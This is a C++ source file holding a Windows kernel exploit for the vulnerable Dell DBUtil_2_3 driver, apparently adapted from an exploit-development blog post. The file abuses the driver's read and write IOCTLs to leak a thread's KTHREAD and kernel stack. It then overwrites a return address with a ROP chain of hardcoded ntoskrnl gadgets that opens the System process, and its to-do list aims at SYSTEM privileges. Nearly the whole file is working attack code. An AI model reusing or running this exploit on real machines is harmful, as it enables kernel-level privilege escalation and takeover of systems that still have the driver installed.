#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include "ErrorHandling.hpp"
/*
	This is based on Connor Mcgarr blog entry
    "Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG "
     
    Used RP.EXE to find Gadgets

    - An Example how to execute shellcode on hybervisor using a supsended thread and API Windows API.

    Do to:
        -Pop cnd.exe
        -Get Adminstraton on cmd
        -Get System

*/
#define IOCTL_WRITE_CODE 0x9B0C1EC8
#define IOCTL_READ_CODE  0x9B0C1EC4

// Note(): These offsets might not reflect the current Windows 10 version you are using.
#define PTE_ADDRESS 0x081648
#define KUSER_SHARED_DATA 0xFFFFF78000000000
#define HALDISPATCHTABLE 0x339230


// Vulerable IOCTL code
#define IOCTL_CODE 0x0022200B

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation,
    SystemLocksInformation,
    SystemStackTraceInformation,
    SystemPagedPoolInformation,
    SystemNonPagedPoolInformation,
    SystemHandleInformation,
    SystemObjectInformation,
    SystemPageFileInformation,
    SystemVdmInstemulInformation,
    SystemVdmBopInformation,
    SystemFileCacheInformation,
    SystemPoolTagInformation,
    SystemInterruptInformation,
    SystemDpcBehaviorInformation,
    SystemFullMemoryInformation,
    SystemLoadGdiDriverInformation,
    SystemUnloadGdiDriverInformation,
    SystemTimeAdjustmentInformation,
    SystemSummaryMemoryInformation,
    SystemMirrorMemoryInformation,
    SystemPerformanceTraceInformation,
    SystemObsolete0,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemKernelDebuggerInformation,
    SystemContextSwitchInformation,
    SystemRegistryQuotaInformation,
    SystemExtendServiceTableInformation,
    SystemPrioritySeperation,
    SystemVerifierAddDriverInformation,
    SystemVerifierRemoveDriverInformation,
    SystemProcessorIdleInformation,
    SystemLegacyDriverInformation,
    SystemCurrentTimeZoneInformation,
    SystemLookasideInformation,
    SystemTimeSlipNotification,
    SystemSessionCreate,
    SystemSessionDetach,
    SystemSessionInformation,
    SystemRangeStartInformation,
    SystemVerifierInformation,
    SystemVerifierThunkExtend,
    SystemSessionProcessInformation,
    SystemLoadGdiDriverInSystemSpace,
    SystemNumaProcessorMap,
    SystemPrefetcherInformation,
    SystemExtendedProcessInformation,
    SystemRecommendedSharedDataAlignment,
    SystemComPlusPackage,
    SystemNumaAvailableMemory,
    SystemProcessorPowerInformation,
    SystemEmulationBasicInformation,
    SystemEmulationProcessorInformation,
    SystemExtendedHandleInformation,
    SystemLostDelayedWriteInformation,
    SystemBigPoolInformation,
    SystemSessionPoolTagInformation,
    SystemSessionMappedViewInformation,
    SystemHotpatchInformation,
    SystemObjectSecurityMode,
    SystemWatchdogTimerHandler,
    SystemWatchdogTimerInformation,
    SystemLogicalProcessorInformation,
    SystemWow64SharedInformation,
    SystemRegisterFirmwareTableInformationHandler,
    SystemFirmwareTableInformation,
    SystemModuleInformationEx,
    SystemVerifierTriageInformation,
    SystemSuperfetchInformation,
    SystemMemoryListInformation,
    SystemFileCacheInformationEx,
    MaxSystemInfoClass

} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    BYTE                 Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    ULONG ProcessId;
    UCHAR ObjectTypeNumber;
    UCHAR Flags;
    USHORT Handle;
    void* Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

// Prototype for ntdll!NtQuerySystemInformation
struct write_what_where
{
    void *what;
    void *where;
};

typedef struct _CLIENT_ID {
   HANDLE UniqueProcess;
   HANDLE UniqueThread;
 } CLIENT_ID;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

 typedef struct _OBJECT_ATTRIBUTES {
  ULONG           Length;
  HANDLE          RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG           Attributes;
  PVOID           SecurityDescriptor;
  PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
//NTSTATUS codes

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_SUCCESS 0x00000000

BOOL ConstructROPChain(HANDLE inHandle, HANDLE dummyThread,ULONG64 KTHREAD, ULONG64 ntBase);
struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what, void* where);
LPVOID FindBaseAddressOfNtoKrnl();
HANDLE InitDriver();
ULONG64 *read64(HANDLE deviceHandle, ULONG64 *addressToRead);
BOOL write64(HANDLE deviceHandle, ULONG64 *targetAddress, ULONG64 *dataToWrite);
HANDLE CreateDummyThread();
void RandomFunction();
ULONG64 LeakThread(HANDLE dummyThreadHandle);
bool WriteToDevice(HANDLE driverHandle, unsigned long long where, unsigned long long what);
unsigned long long ReadFromDevice(HANDLE driverHandle, unsigned long long what);

int main()
{
    LPVOID kernelAddress=NULL;
    HANDLE driverHandle=NULL;
    ULONG64 kThread = 0;
    HANDLE getThreadHandle;
    LPVOID ntBaseAddress=NULL;

    try 
    {
       driverHandle = InitDriver();

        printf("[+] Got driver handle\n");
        printf("[+] Creating Dummy Thread\n");

        getThreadHandle = CreateDummyThread();

        kThread = LeakThread(getThreadHandle);

        printf("[+] Dummy Thread KTHREAD object: 0x%llx\n", kThread);
    
        ntBaseAddress = FindBaseAddressOfNtoKrnl();

        ConstructROPChain(driverHandle, getThreadHandle,kThread,(unsigned long long ) ntBaseAddress);


    } catch (const std::runtime_error& e)
    {
        printf("[-] %s\n", e.what());
        ShowError();
    }
}

/*
    FindBaseAddressOfNtoKrnl()
    ====================================
    Finds the base address of NTKernel32
    Parameters: None
    ====================================
*/
LPVOID FindBaseAddressOfNtoKrnl()
{
    LPVOID base[1024] = {};
    DWORD cbNeeded = 0;

    if (EnumDeviceDrivers(base,1024,&cbNeeded))
    {
        if (base[0])
        {
            return base[0];
        }
    }

    ThrowError("Can not Get Bass address of NTKernel.");
    return 0;
}

/*
    InitDriver()
    ====================================
    Open the handle of DBUtil_2_3 drvier
    Parameters: None
    ====================================
*/

HANDLE InitDriver()
{
    HANDLE handle = NULL;

    handle = CreateFileA(
    "\\\\.\\DBUtil_2_3", 
    0xC0000000,                         
    0,                                  
    NULL,                               
    0x3,                                
    0,                                  
    NULL) ;                              


    if (handle == INVALID_HANDLE_VALUE) ThrowError("Can not InitDriver");

    return handle;
}

/*
    sendtodriver()
    ====================================
    send data to the driver
    parameters (3): 
        devicehandle
        iocode
        void*
    return write_what_where structure
    ====================================
*/
struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what, void* where)
{
    struct  write_what_where whatWhere = {};
    LPDWORD bytesReturned=NULL;;


  //  printf("[+] what is located at: %p!\n",what);
    whatWhere.what = what;
    whatWhere.where = where;
    
    DeviceIoControl(deviceHandle,IOCode ,&whatWhere,8,NULL,0,bytesReturned, NULL );

    return whatWhere;
}

/*
    Read64()
    ====================================
    read bytes from the file

    parameters (3): 
        deviceHandle HANDLE
        addressToRead address
        void*
    return write_what_where structure
    ====================================
*/
ULONG64 *read64(HANDLE deviceHandle, ULONG64 *addressToRead)
{
    void *ptr=NULL;

     ptr = VirtualAlloc(0,sizeof(void*), 0x3000,0x40);

    SendToDriver(deviceHandle, IOCTL_CODE,addressToRead,ptr);

    return (ULONG64*) ptr;
}

/*
    Write64()
    ====================================
    read bytes from the file

    parameters (3): 
        deviceHandle HANDLE
        addressToRead targetAddress uLONG64
        dataToWin ULONG 6224    
        
    returns: boolean
    ====================================
*/

BOOL write64(HANDLE deviceHandle, ULONG64 *targetAddress, ULONG64 *dataToWrite)
{
    BOOL retVar = true;

    SendToDriver(deviceHandle, IOCTL_CODE, dataToWrite,targetAddress);

    return retVar;
}

/*
    ResolveFunc()
    ====================================
    Load NTQuerySystemInfomation from NTDLL.DLL

    ====================================
*/
NtQuerySystemInformation_t resolveFunc()
{
    HMODULE ntDLLHandle = GetModuleHandleW(L"ntdll.dll");

    if (ntDLLHandle)
    {
        NtQuerySystemInformation_t func = (NtQuerySystemInformation_t)GetProcAddress(ntDLLHandle, "NtQuerySystemInformation");
        if (func)
        {
            return func;
        }
    }

    return  (NtQuerySystemInformation_t) 1;
}

/*
    CreateDummyThread()
    ====================================
    Create a dummy thread.
    ====================================
*/

HANDLE CreateDummyThread()
{
    HANDLE dummyThread;

    dummyThread = CreateThread(NULL, 0 ,(LPTHREAD_START_ROUTINE)RandomFunction,NULL,CREATE_SUSPENDED, NULL);


    if (!dummyThread) ThrowError("Can not create Dummy Thread.");
    
    return dummyThread;
}

/*
    LeakThread()
    ====================================
    Leaks KThread

    parameters (1): 
        dummyThreadHandle HANDLE

    ====================================
*/
ULONG64 LeakThread(HANDLE dummyThreadHandle)
{
    NTSTATUS retValue = STATUS_INFO_LENGTH_MISMATCH;

    NtQuerySystemInformation_t NtQuerySystemInformation = resolveFunc();

    if (NtQuerySystemInformation)
    {
        int size = 1;
        ULONG outSize = 0;

        PSYSTEM_HANDLE_INFORMATION out = (PSYSTEM_HANDLE_INFORMATION) malloc(size);

        if (out)
        {
            do
            {
                free(out);
                out = NULL;

                size = size * 2;

                out = (PSYSTEM_HANDLE_INFORMATION) malloc(size);

                if (out)
                {
                    retValue = NtQuerySystemInformation(SystemHandleInformation, out, (ULONG) size, &outSize);
                }

            } while (retValue == STATUS_INFO_LENGTH_MISMATCH);

            if (retValue == STATUS_SUCCESS)
            {
                for (ULONG i=0; i < out->NumberOfHandles;i++)
                {
                    DWORD objectType = 0;
                    objectType = out->Handles[i].ObjectTypeNumber;
                    if (out->Handles[i].ProcessId == GetCurrentProcessId())
                    {
                        if (dummyThreadHandle == (HANDLE) out->Handles[i].Handle)
                        {
                            ULONG64 kThreadObject = 0;

                            kThreadObject = (ULONG64) out->Handles[i].Object;

                            free(out);
                            out=NULL;
                            if ((!kThreadObject & 0x80000000) == 0x80000000)
                            {
                                ThrowError("Error! Unable to leak the KTHREAD object of the \"dummy thread\".");
                            }
                            if ((!kThreadObject & 0xffff00000000000) == 0xffff00000000000 || ((!kThreadObject & 0xfffff00000000000) == 0xfffff00000000000))
                            {
                                ThrowError("Unable to leak KTHREAD object of the \"dummy thread\".");
                            }
                            return kThreadObject;
                        }
                    }
                }
            }
        }
    }

    CloseHandle(dummyThreadHandle);
    return -1;
}

/*
    ConstructROPChain()
    ====================================
    Create ROP CHAIN to openprocess() and Terminate Thread.

    parameters (1):
        HANDLE inHandle
        HANDLE dummyThread
        KTHREAD KTHREAD
        ULONG64  ntBase
    ====================================
*/

BOOL ConstructROPChain(HANDLE inHandle, HANDLE dummyThread,ULONG64 KTHREAD, ULONG64 ntBase)
{
    ULONG64 kThreadStackBase = 0;
    ULONG64 stackBase = 0;
    ULONG64 *stackBase2 = 0;
    ULONG64 retAddr = 0;

    kThreadStackBase = KTHREAD + 0x38;

    stackBase = ReadFromDevice(inHandle, kThreadStackBase);

    if (stackBase == (ULONG64)1) ThrowError("Error can not read address"); 

    printf("[+] Leak kernel-mode stack: 0x%llx\n", stackBase);
    
    printf("[+] NtoKrnl base is %llx\n", ntBase);
   
    for (int i = 0x8;i < 0x7000 - 0x8; i+= 0x8)
    {
        ULONG64 value = NULL;
        value = ReadFromDevice(inHandle,stackBase-i);

        if (value != 0)
        {
            //value = read64(inHandle,  (ULONG64*) ((*stackBase)-i));
            if ((value & 0xfffff00000000000) == 0xfffff00000000000)
		    {
                if ( value == (ntBase + 0x0040360f))
                {
                    retAddr = stackBase-i;
                    break;
                }
            }
        }
        
    }
    

    printf("[+] Stack address: 0x%llx contains nt!KiAPCInterrupt+0x328\n", retAddr);
    
    HANDLE sysprocHandle = NULL;
    CLIENT_ID clientId = {0};
    clientId.UniqueProcess = ULongToHandle(4);
    clientId.UniqueThread = NULL;

    OBJECT_ATTRIBUTES objAttrs = {0};

    memset(&objAttrs, 0 , sizeof(objAttrs));

    objAttrs.ObjectName = NULL;
    objAttrs.Length = sizeof(objAttrs);

    // 0x996440: pop rcx ; ret ;
    WriteToDevice(inHandle, retAddr,ntBase+0x996440);
    WriteToDevice(inHandle, retAddr+0x8,(uint64_t)&sysprocHandle);
    // nt+0xa1a555: pop rdx ; ret ; (1 found)
    WriteToDevice(inHandle, retAddr+0x10,ntBase+0x056ba26);
    // PROCESS_ALL_ACCESS
	WriteToDevice(inHandle, retAddr + 0x18, PROCESS_ALL_ACCESS);		
    //0x140522463: pop r8 ; ret ; (1 found)
	WriteToDevice(inHandle, retAddr + 0x20, ntBase + 0x8a0709);		
    // OBJECT_ATTRIBUTES
	WriteToDevice(inHandle, retAddr + 0x28, (uint64_t)&objAttrs);
    //0x1402f4a8b: pop r9 ; idiv bh ; add rsp, 0x20 ; pop rdi ; ret ; (1 found)
    WriteToDevice(inHandle, retAddr + 0x30, ntBase+0x2f4a8b);
    WriteToDevice(inHandle, retAddr + 0x40, (uint64_t)&clientId);
    WriteToDevice(inHandle, retAddr + 0x48, 0x4141414141414141); // padding for rsp 0x20

    WriteToDevice(inHandle, retAddr + 0x50, ntBase+0xa1a555);// pop rax ; ret ;
    WriteToDevice(inHandle, retAddr + 0x58, ntBase+0x3fac80);// zw!OpenProcess
    WriteToDevice(inHandle, retAddr + 0x60, ntBase+0x5feaf6); // jmp rax 0x1405feaf6
    WriteToDevice(inHandle, retAddr + 0x68, ntBase+0x996440); // pop rcx; ret;
    WriteToDevice(inHandle, retAddr + 0x70, (ULONG64)dummyThread); //dummyThread
    WriteToDevice(inHandle, retAddr + 0x78, ntBase+0x6253b3); //pop rdx ; ret ;
    WriteToDevice(inHandle, retAddr + 0x80, 0x0000000000000000); //Set Exit code to STATUS_SUCCESS    
    WriteToDevice(inHandle, retAddr + 0x88,ntBase+0xa1a555); // pop rax ; ret ;
    WriteToDevice(inHandle, retAddr + 0x90,ntBase+0x03fb220); // ZwTerminateThread ;
    WriteToDevice(inHandle, retAddr + 0x98, ntBase+0x5feaf6); // jmp rax

    ResumeThread(dummyThread);
    
    return true;
}


/*
    WriteToDevice()
    ====================================
    This will write data to the drive

    parameters (3):
        driverHandle
        where
        what
    ====================================
*/
bool WriteToDevice(HANDLE driverHandle, unsigned long long where, unsigned long long what)
{
    unsigned long long inBuf[4]={};
    DWORD bytesReturned = 0;

    unsigned long long one   = 0x4141414141414141;
    unsigned long long two=   (unsigned long long) where;
    unsigned long long three=  0x0000000000000000;
    unsigned long long four=   what;

    memset(inBuf, 0x00, 24);

    memcpy(inBuf, &one, 0x8);
    memcpy(&inBuf[1], &two, 0x8);
    memcpy(&inBuf[2], &three, 0x8);
    memcpy(&inBuf[3], &four, 0x8);

    bool interact = DeviceIoControl(
            driverHandle,
            IOCTL_WRITE_CODE,
            &inBuf,
            sizeof(inBuf),
            &inBuf,
            sizeof(inBuf),
            &bytesReturned,
            NULL
    );

    return interact;
}

/*
    ReadFromDevice()
    ====================================
    This will Read from the drivers

    parameters (3):
        driverHandle
        what
    ====================================
*/
unsigned long long ReadFromDevice(HANDLE driverHandle, unsigned long long what)
{
    unsigned long long inBuf[4]={};
    DWORD bytesReturned = 0;

    unsigned long long one   = 0x4141414141414141;
    unsigned long long two=    what;
    unsigned long long three=  0x0000000000000000;
    unsigned long long four=   0x0000000000000000;

    inBuf[0] = one;
    inBuf[1] = two;
    inBuf[2] = three;
    inBuf[3] = four;

    bool interact = DeviceIoControl(
            driverHandle,
            IOCTL_READ_CODE,
            &inBuf,
            sizeof(inBuf),
            &inBuf,
            sizeof(inBuf),
            &bytesReturned,
            NULL
    );

    return inBuf[3];
}
